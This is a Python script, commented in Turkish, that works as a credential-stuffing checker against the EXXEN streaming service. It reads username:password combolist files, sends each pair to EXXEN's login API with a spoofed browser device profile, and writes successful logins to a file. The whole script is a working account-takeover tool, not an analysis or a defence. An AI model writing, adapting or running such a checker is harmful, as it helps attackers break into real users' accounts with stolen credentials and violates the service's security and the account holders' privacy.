import requests
import base64
import os

def login_to_exxen(thomas_tool: str) -> bool:
    """
    EXXEN API'sine giriş yapmayı dener.
    
    :param thomas_tool: Base64 ile kodlanmış kullanıcı adı ve şifre (örn: "kullanici:sifre" base64 formatında).
    :return: Giriş başarılıysa True, değilse False.
    """
    login_url = "https://mw-proxy.app.exxen.com/user/login"
    login_headers = {
        "accept": "application/json,text/plain,*/*",
        "content-type": "application/json",
        "authorization": f"Basic {thomas_tool}"
    }
    login_payload = {
        "deviceDetails": {
            "deviceName": "Chrome",
            "deviceType": "Desktop",
            "modelNo": "131.0.0.0",
            "serialNo": "131.0.0.0",
            "brand": "Chrome",
            "os": "Windows",
            "osVersion": "10"
        }
    }

    try:
        response = requests.post(login_url, headers=login_headers, json=login_payload)
        response.raise_for_status()  # HTTP hatalarını yakalar
        return response.status_code == 200 and response.json().get("bearer", {}).get("auth", {}).get("token")
    except requests.exceptions.RequestException as e:
        print(f"Giriş sırasında bir hata oluştu: {e}")
        return False

def list_combolist_files(directory: str) -> list:
    """
    Verilen dizindeki combolist dosyalarını listeler.
    
    :param directory: Dosyaların bulunduğu dizin yolu.
    :return: Dosyaların listesi.
    """
    try:
        files = [f for f in os.listdir(directory) if f.endswith('.txt')]
        return files
    except FileNotFoundError:
        print(f"Dizin bulunamadı: {directory}")
        return []

def check_accounts_from_file(file_path: str):
    """
    Dosyadaki hesapları kontrol eder ve başarılı girişleri anlık olarak kaydeder.
    
    :param file_path: Hesapların bulunduğu dosyanın yolu.
    """
    try:
        with open(file_path, 'r') as file:
            accounts = file.readlines()

        for account in accounts:
            account = account.strip()  # Boşlukları temizle
            if ':' in account:
                # Base64 ile kodlama
                thomas_tool_base64 = base64.b64encode(account.encode()).decode()

                # Giriş denemesi
                if login_to_exxen(thomas_tool_base64):
                    print(f"Başarılı giriş: {account}")
                    # Başarılı girişleri anlık kaydet
                    with open("successful_logins.txt", 'a') as output_file:
                        output_file.write(f"{account}\n")
                else:
                    print(f"Başarısız giriş: {account}")
            else:
                print(f"Geçersiz format: {account}")

    except FileNotFoundError:
        print(f"Dosya bulunamadı: {file_path}")
    except Exception as e:
        print(f"Bir hata oluştu: {e}")

# Ana fonksiyon
if __name__ == "__main__":
    directory = '.'  # Burada dizin yolunu değiştirebilirsiniz
    combolist_files = list_combolist_files(directory)

    if not combolist_files:
        print("Hiçbir combolist dosyası bulunamadı.")
    else:
        print("Mevcut combolist dosyaları:")
        for i, file in enumerate(combolist_files, 1):
            print(f"{i}. {file}")
        
        try:
            choice = int(input("Bir dosya seçin (1, 2, 3...): ")) - 1
            if 0 <= choice < len(combolist_files):
                selected_file = combolist_files[choice]
                print(f"Seçilen dosya: {selected_file}")
                check_accounts_from_file(selected_file)
            else:
                print("Geçersiz seçim.")
        except ValueError:
            print("Lütfen geçerli bir sayı girin.")